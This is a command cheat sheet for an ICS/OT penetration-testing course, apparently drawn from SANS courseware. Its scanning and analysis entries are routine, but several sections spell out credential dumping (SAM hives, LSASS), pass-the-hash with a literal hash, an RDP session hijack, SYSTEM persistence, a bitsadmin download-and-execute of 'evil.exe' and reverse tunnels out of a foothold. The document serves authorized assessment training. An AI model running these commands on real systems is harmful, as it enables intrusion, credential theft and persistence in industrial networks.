# ICS613 Tool and Command Cheat Sheet

**ICS/OT Penetration Testing and Assessments**

A reference to the tools and commands introduced across the ICS613 courseware (books 613.1 through 613.5 and the Lab Workbook). 

Tools are grouped by function. The "Day" column maps each entry back to the source book (1-5) or Workbook (WB). Command examples are drawn from the lab material; where the courseware names a tool without printing a command, an accurate CLI example is provided. 

Tools that are GUI-only, SaaS platforms, hardware, reference websites, or umbrella suites (Burp Suite, NetRise, Dragos NP-View, ChipWhisperer, LOLBAS, GTFOBins, Sysinternals Suite, the note-taking apps, and the lab platforms) carry no command line; their entry is the table row and link only.

Vendor engineering, HMI, historian, and DCS software is covered in a companion file, `ICS613_Vendor_Software_Reference.md`.


## Note-Taking and Assessment Management

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Obsidian | Markdown-based note-taking application extended with plugins for organizing assessment data. | 2 | https://obsidian.md/ |
| CherryTree | Hierarchical note-taking application installed by default in Kali. | 2 | https://www.giuspen.net/cherrytree/ |
| OneNote | Microsoft note-taking application usable for assessment documentation. | 2 | https://www.microsoft.com/en-us/microsoft-365/onenote/digital-note-taking-app |
| MITRE ATT&CK Navigator | Web tool for mapping and visualizing observed techniques against the ATT&CK matrix. | 2 | https://mitre-attack.github.io/attack-navigator/ |
| MITRE ATT&CK for ICS | Knowledge base of adversary tactics and techniques specific to control systems. | 2 | https://attack.mitre.org/matrices/ics/ |

## Network Discovery and Scanning

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Nmap | Port scanner and service-detection engine, the workhorse for host and service discovery. | 1,3,WB | https://nmap.org |
| Test-NetConnection | Built-in PowerShell cmdlet for testing whether specific TCP services are reachable when Nmap is unavailable. | 3,WB | Vendor (Microsoft) |
| AngryIPScanner | Lightweight IP/port scanner frequently found pre-installed on OT workstations. | 3 | https://angryip.org/download/ |
| Shodan / Censys | Internet-wide scan search engines for locating internet-exposed remote-access services. | 3 | https://www.shodan.io/ ; https://censys.com/ |

**Commands**

```bash
# Service/version detection against a single host
nmap -sV 192.168.0.10

# Full TCP port sweep, no ping, no DNS, aggressive timing
nmap -n -Pn -T5 -sV -sT -p- --open 192.168.0.10

# UDP scan on a specific interface with a custom NSE script
nmap -n -Pn -e eth0 -sU -p 25425 --script ./ics613_click_plc_version.nse 192.168.0.10

# RDP enumeration via NSE
nmap -n -Pn --script rdp-ntlm-info -p 3389 192.168.0.10

# HTTP header grab, output to all formats
nmap -n -Pn --script http-headers -p 8080 -oA ics613_ext_service_headers 192.168.0.10
```

```powershell
# Test one or several TCP ports from Windows without Nmap
Test-NetConnection scanme.nmap.org -Port 22
Test-NetConnection 10.161.1.1 -Port 445

# Sweep a range of ports across a range of hosts, reporting only open ports
$hosts = 1..20 | ForEach-Object { "10.161.1.$_" }   # 10.161.1.1 - .20
$ports = 20,21,22,23,80,102,443,445,502,44818       # or a range: 1..1024
foreach ($h in $hosts) {
    foreach ($p in $ports) {
        if ((Test-NetConnection -ComputerName $h -Port $p -WarningAction SilentlyContinue).TcpTestSucceeded) {
            "OPEN  $h : $p"
        }
    }
}

# Faster alternative: TcpClient with explicit timeout (better for wide port/host ranges)
# Test-NetConnection has no timeout parameter and is slow for sweeps; TcpClient.ConnectAsync
# with a short wait is significantly faster across the same scope.
$hosts  = 1..20 | ForEach-Object { "10.161.1.$_" }
$ports  = 20,21,22,23,80,102,443,445,502,44818
$timeout = 500   # milliseconds; tune to network latency

foreach ($h in $hosts) {
    foreach ($p in $ports) {
        $tcp = [System.Net.Sockets.TcpClient]::new()
        $connect = $tcp.ConnectAsync($h, $p)
        if ($connect.Wait($timeout) -and $tcp.Connected) {
            "OPEN  $h : $p"
        }
        $tcp.Dispose()
    }
}
```

```text
# Shodan: search the target organization's internet-exposed assets
org:"613LNG, LLC"

# Narrow to exposed remote-access and OT services for that org
org:"613LNG, LLC" port:3389,5900,502,44818,102

# Scope by hostname or ASN instead of org name when known
hostname:613lng.com
```

## Packet Capture and Traffic Analysis

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Wireshark | GUI protocol analyzer for deep packet inspection and OT protocol decoding. | 1,4,5,WB | https://www.wireshark.org/ |
| tshark | Command-line Wireshark for scripted capture, filtering, and field extraction. | 4,WB | https://www.wireshark.org/ |
| dumpcap | Lightweight command-line capture engine underlying Wireshark. | 4 | https://www.wireshark.org/ |
| mergecap | Wireshark utility that merges multiple capture files into one. | 4 | https://www.wireshark.org/docs/man-pages/mergecap.html |
| editcap | Wireshark utility that splits, trims, or converts capture files. | 4 | https://www.wireshark.org/docs/man-pages/editcap.html |
| capinfos | Wireshark utility that prints summary statistics about a capture file. | 4 | https://www.wireshark.org/docs/man-pages/capinfos.html |
| tcpdump | Command-line packet capture tool for headless or constrained hosts. | 4 | https://www.tcpdump.org/ |
| Zeek | Network-monitoring framework that produces behavioral connection logs when full packet analysis is impractical. | 4 | https://zeek.org/ |
| PyShark | Python wrapper around Wireshark display filters for automating packet analysis. | 4,WB | https://pypi.org/project/pyshark/ |
| Scapy | Python framework for constructing, dissecting, and replaying packets at a low level. | 4,WB | https://scapy.net/ |

**Commands**

```bash
# Ethernet conversation summary from a capture
tshark -q -z conv,eth -r <file.pcap>

# Extract a single field, filtered, from a capture
tshark -Y "udp" -T fields -e data.data -r ics613_wireshark_PLC_connect_data.pcap

# List available statistics
tshark -z help

# Merge a set of rolling captures into one file
mergecap tcpdump_capture.pcapng.* -w combined.pcapng

# Print capture file statistics
capinfos combined.pcapng

# Split a capture into 50,000-packet files
editcap -c 50000 combined.pcapng split.pcapng

# Zeek: generate behavioral logs from a capture file
zeek -r combined.pcapng

# tcpdump: capture on an interface to a file
tcpdump -i eth0 -w capture.pcap

# dumpcap: capture on an interface to a file (lower overhead than tshark)
dumpcap -i eth0 -w capture.pcapng
```

```python
# PyShark: iterate packets from a capture with a display filter
import pyshark
cap = pyshark.FileCapture("combined.pcapng", display_filter="modbus")
for pkt in cap:
    print(pkt)

# Scapy: read a capture and summarize packets
from scapy.all import rdpcap
for pkt in rdpcap("combined.pcapng"):
    print(pkt.summary())
```

## ICS Protocol Interaction Libraries

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| pyModbusTCP | Python library providing a full Modbus TCP client and server. | 2,5,WB | https://github.com/sourceperl/pyModbusTCP |
| pymodbus | Python Modbus stack for reading and writing PLC registers and coils. | 2,5,WB | https://github.com/pymodbus-dev/pymodbus |
| pylogix | Python library that communicates with Rockwell ControlLogix and CompactLogix PLCs over EtherNet/IP CIP. | 2,5 | https://github.com/dmroeder/pylogix |
| python-snap7 | Python wrapper for Snap7 that communicates with Siemens S7-series PLCs over the S7 protocol. | 5 | https://github.com/gijzelaerr/python-snap7 |
| opcua-asyncio (FreeOpcUa) | Asynchronous Python library for building OPC-UA clients and servers. | 5,WB | https://github.com/FreeOpcUa/opcua-asyncio |
| BAC0 | Python library for interacting with BACnet building-automation devices. | 5 | https://github.com/ChristianTremblay/BAC0 |
| iec104-python | Python library for the IEC 60870-5-104 protocol used in electric-sector telecontrol. | 5 | https://github.com/fraunhofer-fit-dien/iec104-python |
| dnp3 (stepfunc) | Rust DNP3 protocol stack (with C/Java/.NET bindings) for interacting with DNP3 outstations and masters. | 5 | https://github.com/stepfunc/dnp3 |

**Commands**

```python
# pyModbusTCP: read 10 holding registers starting at address 0 (from 613.5)
from pyModbusTCP.client import ModbusClient
c = ModbusClient(auto_open=True)
regs_l = c.read_holding_registers(0, 10)
print(regs_l)

# opcua-asyncio: create an OPC-UA client (from 613.5)
import asyncio
from asyncua import Client
url = "opc.tcp://localhost:4840/freeopcua/server/"

# pylogix: read a tag from a Rockwell PLC
from pylogix import PLC
with PLC() as comm:
    comm.IPAddress = "192.168.0.10"
    print(comm.Read("MyTagName").Value)

# python-snap7: read a data block from a Siemens S7 PLC
import snap7
client = snap7.client.Client()
client.connect("192.168.0.10", 0, 1)  # rack 0, slot 1
data = client.db_read(1, 0, 4)        # DB1, start 0, 4 bytes

# BAC0: connect and read a BACnet object property
import BAC0
bacnet = BAC0.connect()
val = bacnet.read("192.168.0.10 analogInput 1 presentValue")

# iec104-python: create an IEC 60870-5-104 client connection
import c104
client = c104.Client()
connection = client.add_connection(ip="192.168.0.10", port=2404)
```

```bash
# dnp3 (stepfunc): the base library and examples are written in Rust
# build the workspace, then run the packaged master and outstation examples via cargo
git clone https://github.com/stepfunc/dnp3.git && cd dnp3
cargo build --examples
# run the master example (in one terminal), pass a transport arg such as tcp
cargo run --example master -- tcp
# run the outstation example (in another terminal)
cargo run --example outstation -- tcp
```

## Metasploit and Exploitation

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Metasploit Framework | Exploitation framework used for SCADA scanner modules and ThinVNC exploitation. | 1,WB | https://github.com/rapid7/metasploit-framework ; https://metasploit.com/download |
| searchsploit / Exploit-DB | Offline exploit archive and search tool used to locate the ThinVNC exploit. | WB | https://www.exploit-db.com/searchsploit |
| ThinVNC (target) | Vulnerable remote-desktop web service (port 8080/TCP) exploited via directory traversal to read `ThinVnc.ini` credentials. | WB | Target software, not an assessor tool |

**Commands**

```bash
# Modbus banner grab
use auxiliary/scanner/scada/modbus_banner_grabbing
set RHOSTS 192.168.0.10
run

# Enumerate Modbus unit IDs
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS 192.168.0.10
set UNIT_ID_TO 10
run

# Read/write Modbus registers and coils
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.0.10
set DATA_ADDRESS 0
set NUMBER 50
set HEXDUMP true
set ACTION READ_HOLDING_REGISTERS   # or READ_COILS
run

# EtherNet/IP CIP identity enumeration
use auxiliary/scanner/scada/enip_identity
set RHOSTS 192.168.0.10
set RPORT 44818
run

# Search for SCADA/ENIP modules
search auxiliary/scanner/scada
search enip_
```

```bash
# Search the offline Exploit-DB for the ThinVNC exploit (from Workbook)
searchsploit thinvnc
```

```text
# ThinVNC directory-traversal path used to leak credentials
GET /xyz/../../ThinVnc.ini
```

## Windows and Active Directory Enumeration

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| BloodHound | Graph tool for visualizing and analyzing Active Directory attack paths. | 3,4 | https://specterops.io/bloodhound-community-edition |
| SharpHound | BloodHound data collector run against a domain-joined host. | 3,4 | https://specterops.io/bloodhound-community-edition |
| PingCastle | AD configuration auditor that produces an HTML risk report to complement BloodHound. | 3,4 | https://www.pingcastle.com/ |
| ADExplorer | Sysinternals AD browser that captures an offline snapshot of the directory. | 4,WB | https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer |
| Invoke-ADEnum | PowerShell (PSv3+) script that automates AD information gathering and produces a report. | 4,WB | https://github.com/Leo4j/Invoke-ADEnum |
| Sysinternals Suite | Microsoft utilities (ADExplorer, Procmon, Autoruns, TCPView, ProcDump) for Windows inspection. | 3,4 | https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite |
| CHAPS | Read-only PowerShell scripts for auditing Windows security configuration. | 3,4,WB | https://github.com/cutaway-security/chaps |
| WES-NG | Windows Exploit Suggester Next Generation, correlating `systeminfo` output against known patches to find missing fixes. | 4,WB | https://github.com/bitsadmin/wesng |

**Commands**

```powershell
# WES-NG: update CVE list, then analyze collected systeminfo
wes --update
wes systeminfo.txt

# Invoke-ADEnum: automated AD enumeration to HTML
Import-Module .\Invoke-ADEnum.ps1
Invoke-ADEnum -OutputFile ad-enum.html

# Group Policy report export
Get-GPOReport -All -ReportType HTML -Path "$((Get-Location).Path)/SANS-DC-GPO_All.html"

# CHAPS: run the read-only config audit from the CHAPS directory (from Workbook)
.\chaps_PSv3.ps1

# SharpHound: collect all AD data for BloodHound
.\SharpHound.exe -c All

# PingCastle: run the default health-check audit
.\PingCastle.exe --healthcheck --server <domain>

# ADExplorer: capture an offline snapshot of the directory
.\ADExplorer.exe -snapshot "" C:\temp\ad-snapshot.dat
```

## Living Off the Land (LOTL / LOLBin)

LOTL is the preferred approach in ICS environments, not a fallback. These built-in binaries are already present, already trusted, and generate less unexpected activity than external tooling.

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| LOLBAS | Reference library of Windows binaries, scripts, and libraries with known dual-use capabilities. | 3 | https://lolbas-project.github.io/ |
| GTFOBins | Reference library of Unix/Linux binaries with dual-use capabilities. | 3 | https://gtfobins.github.io/ |
| net / net1 | Built-in tool for enumerating local and domain users, groups, sessions, and account policies. | 3,WB | Vendor (Microsoft) |
| wmic | WMI command-line for querying system, service, and patch information locally or remotely. | 3,4,WB | Vendor (Microsoft) |
| certutil | Signed Microsoft binary used to enumerate AD CS templates and to encode/decode files. | 3,WB | Vendor (Microsoft) |
| bitsadmin | BITS management tool repurposed for file download and execution. | 3,4,WB | Vendor (Microsoft) |
| reg | Registry tool used to read config data and to save SAM/SECURITY/SYSTEM hives. | 3 | Vendor (Microsoft) |
| esentutl | Extensible Storage Engine utility used to copy locked registry hives via VSS. | 3 | Vendor (Microsoft) |
| vssadmin | Volume Shadow Copy admin tool used to create/list shadow copies for hive extraction. | 3 | Vendor (Microsoft) |
| ProcDump | Signed Sysinternals utility used to dump the LSASS process for offline parsing. | 3 | https://learn.microsoft.com/en-us/sysinternals/downloads/procdump |
| pypykatz | Python reimplementation of Mimikatz for parsing LSASS dumps and hives offline. | 3 | https://github.com/skelsec/pypykatz |
| gpresult | Exports the Resultant Set of Policy (RSoP) to reveal applied GPOs and defensive controls. | 3 | Vendor (Microsoft) |
| dsquery | Directory query tool used to find SPN accounts for Kerberoasting. | 3 | Vendor (Microsoft) |
| setspn | Queries accounts configured with Service Principal Names. | 3 | Vendor (Microsoft) |
| schtasks | Task scheduler used for persistence that survives reboots. | 3 | Vendor (Microsoft) |
| netstat | Lists active connections and listening ports; run repeatedly during an engagement. | 3,WB | Vendor (Microsoft) |
| quser | Enumerates active interactive/RDP user sessions on a host, locally or against a remote server. | 3,WB | Vendor (Microsoft) |
| winrs | Windows Remote Shell client for executing commands on a remote host over WinRM. | — | Vendor (Microsoft) |
| PsExec | Signed Sysinternals tool for remote command execution and for launching a SYSTEM shell. | 3,WB | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec |
| tscon | Built-in Terminal Services console tool that reassigns an existing RDP session to another session ID (session hijacking). | 3 | Vendor (Microsoft) |
| mstsc | Built-in Remote Desktop client; its `/shadow` mode observes or controls a live session without disconnecting the user. | 3 | Vendor (Microsoft) |

**Recon and enumeration**

```cmd
:: Local and domain users, groups, and policy
net user
net user /dom
net localgroup
net group /dom
net view /dom
net accounts /dom

:: Enumerate active sessions locally, then across a target list (session-hijack recon)
quser
quser /server:<server>
:: Loop the query across a host list (from 613.3 session-enumeration guidance)
for /f %s in (servers.txt) do @quser /server:%s

:: Full OS property dump and installed patches via WMI
wmic os get * /format:value
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: Chain WMI remote execution through one host to another (from 613.3)
wmic /node:"10.10.10.30" /user:"domain.com\service_account" /password:"<password>" process call create "cmd.exe /c whoami && ipconfig >> C:\temp\file.txt"

:: Baseline system and patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

:: Enumerate AD CS certificate templates (cross-ref ESC1-ESC8)
certutil -v -dstemplate

:: RSoP / applied GPOs for current user and computer
gpresult /SCOPE USER /h gp-user.html
gpresult /SCOPE COMPUTER /h gp-computer.html

:: Kerberoastable SPN accounts
setspn.exe -Q */*
dsquery * "ou=domain controllers,dc=<domain>,dc=com" -filter "(&(objectcategory=computer)(servicePrincipalName=*))" -attr distinguishedName servicePrincipalName > spns.txt

:: Find the domain controller
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```

```powershell
# Enumerate host IPs matching the process subnet
Get-NetIPAddress | Where-Object {$_.IPAddress -match "192.168.0.*"}

# Missing-patch and hotfix inventory (native, no external tools)
Get-HotFix | Select-Object -Property HotFixID
Get-ComputerInfo
```

**Egress and DNS testing**

```cmd
:: View cached DNS entries, filter for hostnames
ipconfig /displaydns | findstr /i "name host"

:: Test outbound DNS resolution
nslookup portquiz.net
nslookup teamviewer.com

:: List active TCP connections, excluding loopback/wildcard
netstat -antob | findstr /V /C:"127.0.0.1:" /C:"0.0.0.0:"
```

**File transfer via signed binaries**

```powershell
# certutil base64 encode/decode a binary (LOTL transfer)
certutil -encode Psexec.exe psexec.base64
certutil -decode .\psexec.base64 Psexec.exe
```

```cmd
:: winrs: execute a command on a remote host over WinRM
winrs -r:WS0AA -u:613lng\amacdonr -p:<password> "whoami && hostname"
```

**Session hijacking** (all from 613.3; each requires local administrator / SYSTEM). Enumerate the target session ID with `quser` first.

```cmd
:: Hijack an RDP session with tscon (reassign it to your session)
psexec.exe -i -s cmd.exe
quser                          :: get the target session ID
tscon.exe <session id>

:: Less-disruptive alternative: RDP Shadow via mstsc (view/control without disconnecting)
reg.exe add "\\LOCALHOST\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 2 /F
quser                          :: get the target session ID
mstsc.exe /shadow:<session id> /noConsentPrompt /control
```

> The Shadow registry key is a significant, detectable change — document it and revert it at the end of the engagement. Prefer shadowing sessions idle for a while; if the operator returns mid-hijack, both parties see the same session and may trigger incident response.

```cmd
:: bitsadmin remote download and execute
bitsadmin /create 1 & bitsadmin /addfile 1 https://staging.domain.com/evil.exe c:\temp\evil.exe & bitsadmin /SetNotifyCmdLine 1 c:\temp\evil.exe NULL & bitsadmin /RESUME 1
```

**Persistence**

```cmd
:: Scheduled task running every minute as SYSTEM
schtasks /create /sc minute /mo 1 /tn "persistence" /tr C:\temp\persistence.cmd /ru "SYSTEM"
```

## Credential Access and Lateral Movement

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| NetExec (nxc) | Successor to CrackMapExec, executing remote commands and dumping credentials over SMB and WinRM. | 3,5,WB | https://github.com/Pennyw0rth/NetExec |
| Impacket (smbexec.py, wmiexec.py, secretsdump.py) | Python toolkit providing remote command execution over SMB/WMI and remote credential extraction. | 3 | https://github.com/fortra/impacket |
| Rubeus | Kerberos abuse tool used to request TGTs from certificates during AD CS exploitation. | 3,WB | https://github.com/GhostPack/Rubeus |
| Volatility 3 | Memory-forensics framework for parsing credential material from a memory dump offline. | 3,5 | https://github.com/volatilityfoundation/volatility3 |

**Commands**

```cmd
:: Dump SAM/SECURITY/SYSTEM hives with reg (fastest, noisiest)
reg save hklm\sam sam
reg save hklm\security security
reg save hklm\system system

:: Dump locked hives via Volume Shadow Copy with esentutl
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system

:: Create/list a shadow copy explicitly with vssadmin
vssadmin create shadow /for=C:
vssadmin list shadows

:: Enumerate then dump LSASS with ProcDump
tasklist /fi "imagename eq lsass.exe"
procdump -accepteula -ma <lsass_pid> c:\temp\lsass.dmp
```

```bash
# Parse hives offline with Impacket secretsdump
secretsdump.py -sam sam -security security -system system LOCAL

# Parse an LSASS dump offline with pypykatz
pypykatz lsa minidump lsass.dmp

# NetExec pass-the-hash SAM dump over SMB (from Workbook)
nxc smb WS0AA -d 613lng -u amacdonr -H 89FD49222C1E9377BFFF9C961685921E --sam

# NetExec remote command execution over SMB
nxc smb 192.168.0.10 -u <user> -H <nthash> -x "whoami"
```

```text
:: Rubeus: request a TGT from a certificate and recover the NT hash (from Workbook)
Rubeus.exe asktgt /user:amacdonr /certificate:C:\Users\pentest\Desktop\Tools\cert.pfx /getcredentials

:: Rubeus: request a TGT and inject it into the current logon session with /ptt
Rubeus.exe asktgt /user:amacdonr /certificate:C:\Users\pentest\Desktop\Tools\cert.pfx /ptt
```

```bash
# Volatility 3: dump cached credential hashes from a memory image
python3 vol.py -f memory.dmp windows.hashdump

# Volatility 3: extract SAM registry hive contents (user hashes) from a memory image
python3 vol.py -f memory.dmp windows.registry.hivelist
python3 vol.py -f memory.dmp windows.registry.printkey --key "SAM\\Domains\\Account\\Users"
```

## Pivoting and Egress Testing

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Ligolo-ng | Modern pivoting tool that establishes a TUN interface and routes traffic through a compromised host. | 3 | https://github.com/nicocha30/ligolo-ng |
| frp (Fast Reverse Proxy) | Reverse-proxy tool that reaches a local server sitting behind a firewall or NAT. | 3 | https://github.com/fatedier/frp |
| socat | Multipurpose relay used with PowerShell to identify outbound egress channels from a foothold. | 3 | http://www.dest-unreach.org/socat/ |
| GOST (GO Simple Tunnel) | Flexible tunneling proxy that builds forward/reverse relays, port forwards, and TUN/TAP pivots across many protocols. | 3 | https://gost.run/en/ |
| SSH (OpenSSH) | Native client used for local, remote, and dynamic port forwarding and ProxyJump chaining. | 3 | Built-in (OpenSSH) |
| proxychains | Forces arbitrary tools through a SOCKS proxy created by an SSH dynamic forward. | 3 | https://github.com/haad/proxychains |

**Commands**

```bash
# SSH local port forward (reach a remote service on a local port)
ssh -N -f -L 1234:127.0.0.1:80 root@web-server.local

# SSH remote port forward (expose a service through an intermediary)
ssh -N -f -R 1234:127.0.0.1:80 root@internal-server.local

# SSH dynamic SOCKS proxy (for use with proxychains)
ssh -N -f -D 8080 root@internal-server.local

# ProxyJump chain through multiple hosts
ssh -J root@web-server.local,root@internal-server.local root@historian.local

# socat egress listener with iptables port forwarding (external server)
iptables -t nat -p tcp -I PREROUTING -m multiport --dports 1:65535 -j DNAT --to-destination :1010
socat TCP4-LISTEN:1010,fork,reuseaddr

# Ligolo-ng: start the proxy (operator) and connect the agent (target)
./proxy -selfcert                          # on the operator machine
./agent -connect <operator-ip>:11601 -ignore-cert   # on the compromised host

# frp: reverse-proxy client on the foothold reaching an frps server
./frpc -c frpc.toml

# GOST: local SOCKS5 proxy on port 1080
gost -L socks5://:1080

# GOST: reverse relay - expose an internal service out through a relay you control
# on the relay you control:
gost -L tcp://:8443
# on the foothold, forward an internal host to that relay:
gost -L rtcp://:8443/192.168.0.10:502 -F <relay-ip>:8443

# GOST: chain through multiple hops with -F
gost -L :1080 -F socks5://hop1:1080 -F socks5://hop2:1080
```

```powershell
# PowerShell full-range egress scan against the external server
1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
```

## Firmware and Hardware Analysis

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Ghidra | Disassembler and decompiler for analyzing extracted firmware binaries. | 1,WB | https://github.com/NationalSecurityAgency/ghidra |
| Binwalk | Firmware extraction tool that identifies file systems, compressed archives, and embedded executables. | 1 | https://github.com/ReFirmLabs/binwalk |
| EMBA | Open-source firmware security analyzer covering extraction, static analysis, dynamic analysis via emulation, SBOM generation, and CVE-correlated HTML reporting. | — | https://github.com/e-m-b-a/emba |
| OFRAK | Binary analysis and modification platform that unpacks, modifies, and repacks firmware binaries. | 1 | https://github.com/redballoonsecurity/ofrak |
| NetRise | Firmware-analysis platform that identifies software components and correlates them against known CVEs. | 1,WB | https://www.netrise.io/ |
| Burp Suite | Web-proxy and application-testing tool used against device web interfaces during bench testing. | 1 | https://portswigger.net/burp |
| OpenOCD | On-chip debugger providing the hardware-level interface for JTAG and SPI interactions. | 1 | https://openocd.org/ |
| Tigard | Multi-protocol hardware debug adapter supporting JTAG, SPI, I2C, UART, and SWD from a single device. | 1 | https://hackerwarehouse.com/product/tigard/ |
| ChipWhisperer | Open-source hardware platform for side-channel power analysis and fault-injection attacks. | 1 | https://github.com/newaetech/chipwhisperer |
| Multimeter | Handheld meter for measuring voltage and continuity during circuit-board inspection. | 1 | Hardware (any vendor) |

**Commands**

```bash
# Binwalk: scan and extract a firmware image
binwalk firmware.bin
binwalk -e firmware.bin

# EMBA: install dependencies, then run a full firmware scan (Docker mode)
git clone https://github.com/e-m-b-a/emba.git && cd emba
sudo ./installer.sh -d
sudo ./emba -l ~/emba_log -f /path/to/firmware.bin

# EMBA: run with the default emulation-enabled scan profile
sudo ./emba -l ~/emba_log -f /path/to/firmware.bin -p ./scan-profiles/default-scan-emulation.emba

# strings: pull readable text from a firmware blob
strings -n 8 firmware.bin

# OpenOCD: connect to a target via an interface config
openocd -f interface/tigard.cfg -f target/<target>.cfg

# OFRAK: launch the GUI/CLI to unpack a firmware image
ofrak gui -f firmware.bin

# Ghidra: run headless analysis on a binary without the GUI
# analyzeHeadless lives in $GHIDRA_HOME/support/ and is not on PATH by default
$GHIDRA_HOME/support/analyzeHeadless /path/to/project ProjectName -import firmware.bin

# One-shot analysis with auto-cleanup of the project directory afterwards
$GHIDRA_HOME/support/analyzeHeadless /tmp/ghidra_tmp FirmwareAnalysis -import firmware.bin -deleteProject
```

## Configuration Review and Reporting

| Tool | Purpose | Day | Source |
|------|---------|-----|--------|
| Titania Nipper | Audits firewall and network-device configurations against known best practices. | 4 | https://www.titania.com/products/nipper |
| Dragos NP-View (Network Perception) | Analyzes network configurations and firewall rules against CIS benchmarks and compliance frameworks. | 4 | https://www.network-perception.com/product |

---

## Course Book Legend

- **1** = 613.1 Bench and Lab Testing
- **2** = 613.2 Preparing for ICS/OT Assessments
- **3** = 613.3 Top-Down Active Methodology
- **4** = 613.4 Security and Vulnerability Assessment
- **5** = 613.5 Bottom-Up Operations Assessment and Capstone
- **WB** = ICS613 Lab Workbook

*Source material: ICS613 courseware, © 2026 SANS Institute.*
